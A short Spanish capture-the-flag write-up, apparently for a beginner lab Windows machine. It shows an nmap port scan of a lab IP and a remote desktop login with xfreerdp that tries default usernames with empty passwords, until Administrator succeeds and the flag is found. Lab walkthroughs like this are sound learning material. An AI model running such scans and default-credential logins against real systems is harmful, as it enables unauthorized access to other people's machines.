## Datos principales

* #Enumeracion de puertos
* #Redes
* #Remote Desktop Protocol
* #Xfreerdp
* SO : #Windows

## Enumeración de puertos

Para  empezar el escaneo usamos la herramienta Nmap, en nuestra fase de descubrimiento , como se puede apreciar tenemos los siguientes puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.221.227
```

Puertos abiertos:
	 *135* -->  msrpc
	 *139* -- > netbios-ssn
	 *445* --> microsoft-ds
	 *3389* --> **ms-wbt-server**
	 *5985* --> wsman 
	 *47001* --> winrm
	 *49664* --> ???
	 *49665* --> ???
	 *49666* --> ???
	 *49667* --> ???
	 *49668* --> ???
	 *49669* --> ???

Al ser una máquina Windows vamos a probar el servicio **ms-wbt-server** para conectarnos remotamente a la maquina en el puerto 3389 para ello necesitamos hacer el comando y usar la herramienta xfreerdp

```bash
xfreerdp /v:<ip>
xfreerdp /v:10.129.221.227
```

Podemos ver que nos pide un unas credenciales y dominio en una ventana aparte.

Buscando acerca del funcionamiento de esta herramienta encuentro que con la opción /u podemos poner usuarios por defecto  vamos a probar posibles usuarios como son admin, root, y por ultimo Administrator con las password vacías .

```bash
xfreerdp /v:10.129.221.227 /u:root
xfreerdp /v:10.129.221.227 /u:user
xfreerdp /v:10.129.221.227 /u:Administrator (Funciona)
```

Podemos ver que se nos abre un acceso remoto a la máquina con interfaz gráfica, donde podemos encontrar la flag.txt